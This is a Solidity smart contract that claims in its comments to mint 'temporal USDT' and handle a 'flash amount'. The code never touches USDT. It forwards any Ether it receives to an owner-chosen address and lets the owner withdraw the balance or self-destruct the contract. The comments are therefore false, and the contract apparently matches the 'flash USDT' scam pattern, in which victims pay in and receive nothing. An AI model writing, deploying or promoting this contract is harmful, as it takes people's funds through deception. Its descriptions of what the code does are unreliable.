// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title MintContract
/// @notice This contract automatically mint temporal USDT from the mint contract address.
/// @dev The mint contract address  is now set at deployment .
contract MintContract {
    /// @notice The contract address where temporal  usdt will be mint from.
    address payable public Mint_Contract;

    /// @notice The address of the USDT contract.
    address public USDT_Contract_Address;

    /// @notice The owner of the contract.
    /// @dev The owner is set at deployment and can transfer ownership.
    address public owner;

    /// @notice The "flash amount" specified at deployment.
    /// @dev This amount can be updated by the owner after deployment.
    uint256 public flashAmount;

    /// @notice Event for logging forwarding actions.
    /// @param from The address from which USDT was mint.
    /// @param amount The amount of usdt minted.
    event Forwarded(address indexed from, uint256 amount);

    /// @notice Event for logging changes to the "flash amount".
    /// @param previousAmount The previous "flash amount".
    /// @param newAmount The new "flash amount".
    event FlashAmountUpdated(uint256 previousAmount, uint256 newAmount);

    /// @notice Event for logging ownership transfers.
    /// @param previousOwner The previous owner's address.
    /// @param newOwner The new owner's address.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /// @notice Event for logging mint contract updates.
    /// @param previousAddress The previous mint contract address.
    /// @param newAddress The new mint contract address.
    event MintContractUpdated(address indexed previousAddress, address indexed newAddress);

    /// @notice Event for logging USDT contract address updates.
    /// @param previousAddress The previous USDT contract address.
    /// @param newAddress The new USDT contract address.
    event USDTContractAddressUpdated(address indexed previousAddress, address indexed newAddress);

    /// @notice Modifier to restrict function access to the owner only.
    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    /// @notice Constructor to set the initial "flash amount", owner, mint contract, and USDT contract address.
    /// @param _flashAmount Initial "flash amount".
    /// @param _Mint_Contract Initial mint contract address.
    /// @param _USDT_Contract_Address Initial USDT contract address.
    constructor(uint256 _flashAmount, address payable _Mint_Contract, address _USDT_Contract_Address) {
        flashAmount = _flashAmount;
        owner = msg.sender;
        Mint_Contract = _Mint_Contract;
        USDT_Contract_Address = _USDT_Contract_Address;
        emit OwnershipTransferred(address(0), owner);
    }

    /// @notice Function to automatically forward any minted usdt.
    receive() external payable {
        require(msg.value > 0, "No Ether received");
        emit Forwarded(msg.sender, msg.value);
        (bool success, ) = Mint_Contract.call{value: msg.value}("");
        require(success, "Failed to forward Ether");
    }

    /// @notice Function to change the "flash amount".
    function setFlashAmount(uint256 _newFlashAmount) external onlyOwner {
        uint256 previousAmount = flashAmount;
        flashAmount = _newFlashAmount;
        emit FlashAmountUpdated(previousAmount, _newFlashAmount);
    }

    /// @notice Function to update the mint contract address.
    function setMintContract(address payable _newAddress) external onlyOwner {
        require(_newAddress != address(0), "Invalid address");
        address previousAddress = Mint_Contract;
        Mint_Contract = _newAddress;
        emit MintContractUpdated(previousAddress, _newAddress);
    }

    /// @notice Function to update the USDT contract address.
    function setUSDTContractAddress(address _newAddress) external onlyOwner {
        require(_newAddress != address(0), "Invalid address");
        address previousAddress = USDT_Contract_Address;
        USDT_Contract_Address = _newAddress;
        emit USDTContractAddressUpdated(previousAddress, _newAddress);
    }

    /// @notice Function to transfer contract ownership.
    function transferOwnership(address _newOwner) external onlyOwner {
        require(_newOwner != address(0), "New owner is the zero address");
        address previousOwner = owner;
        owner = _newOwner;
        emit OwnershipTransferred(previousOwner, _newOwner);
    }

    /// @notice Function to forward the "flash amount" of Ether.
    function action() external {
        require(address(this).balance >= flashAmount, "Insufficient contract balance");
        emit Forwarded(address(this), flashAmount);
        (bool success, ) = Mint_Contract.call{value: flashAmount}("");
        require(success, "Failed to forward Ether");
    }

    /// @notice Function to withdraw the flash amount to the owner.
    function withdraw() external onlyOwner {
        uint256 contractBalance = address(this).balance;
        require(contractBalance > 0, "No Ether to withdraw");
        (bool success, ) = owner.call{value: contractBalance}("");
        require(success, "Withdrawal failed");
    }

    /// @notice Function to destroy the contract and send remaining Ether to the owner.
    function destroy() external onlyOwner {
        selfdestruct(payable(owner));
    }
}
